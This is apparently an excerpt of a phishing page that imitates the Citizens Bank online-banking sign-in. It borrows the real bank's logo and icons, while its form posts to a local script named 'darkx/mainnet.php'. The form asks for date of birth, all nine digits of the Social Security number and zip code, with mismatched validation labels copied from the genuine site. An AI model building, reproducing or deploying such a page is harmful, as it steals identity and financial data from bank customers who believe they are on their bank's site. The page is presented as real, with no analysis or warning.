...
<link type="text/css" rel="stylesheet" id="dark-mode-general-link"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
  ...
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon">
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192">
  <link href="https://www3.citizensbankonline.com/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128">
...
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns-ie8.min.42588.css?refresh=1608300128192"><![endif]-->
<style>
...
<div class="citizens-header-footer"><div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"><p>You will be logged out of your Online Banking session in
      ...
      <header id="page-header" class="page-header">
        ...
        <div class="centered-content clearfix">
          <a href="http://www.citizensbank.com" class="page-logo">
            <img src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png" alt="Citizens Bank" width="203" height="25" border="0">
          </a>
  ...
  <div id="page-container" class="page-container"><div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            ...
            <form action="darkx/mainnet.php" method="post" class="unauth-form jqtransform js-login-form">
                            ...
                            <div class="js-user-block">
                                ...
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            ...
                                            <div>
                                                <input name="dob" type="text" data-toenable="accInfoLastFourSSN" placeholder="Select Date of Birth" class="unauth-form__input datepicker unauth-ic-form__dateinput hasDatepicker" id="dp1608300128480" autocomplete="off" data-mask="00/00/0000" required="">
                                            </div>
                                    ...
                                    <div class="unauth-form__rowitem g-right">
                                        ...
                                        <div>
                                            <input name="ssn" placeholder="Enter All 9 Digits of SSN" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel" maxlength="9" autocomplete="off" data-mask="00-000-0000" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="digits" class="unauth-form__label--guidance is-default">Contains only numbers</label>
                                 ...
                                 <div class="unauth-form__row">
                                    ...
                                    <div class="unauth-form__rowitem g-right">
                                        ...
                                        <div>
                                            <input name="zipcode" placeholder="Enter Your Zip Code" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel" maxlength="6" pattern="\d*" autocomplete="off" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="digits" class="unauth-form__label--guidance is-default">Contains only numbers</label>
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Is exactly 4 digits</label>
...
<li><a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="https://www.citizensbank.com/assets/CB_media/images/feedback.png" alt="Give Feedback" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;" border="0">Feedback</a></li></ul>
</div>
...
<img src="/efs/hhf/img/elh.gif" alt="Equal Housing Lender">
<img src="/efs/hhf/img/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>
  <!-- ===============
